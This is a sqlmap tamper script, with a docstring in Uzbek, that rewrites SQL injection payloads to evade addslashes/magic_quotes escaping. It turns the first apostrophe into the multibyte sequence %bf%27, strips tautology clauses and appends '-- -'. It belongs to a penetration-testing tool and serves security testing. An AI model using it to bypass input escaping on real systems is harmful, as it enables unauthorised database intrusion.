#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Apostrofni %BF%27 ko'p baytli birikmaga almashtirib, oxiriga umumiy izoh qo'shadi.

    Notes:
        * Useful for bypassing magic_quotes/addslashes feature

    Reference:
        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string

    >>> tamper("1' AND 1=1")
    '1%bf%27-- -'
    """

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            if _ != retVal:
                retVal = _
                retVal += "-- -"
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- -"
    return retVal
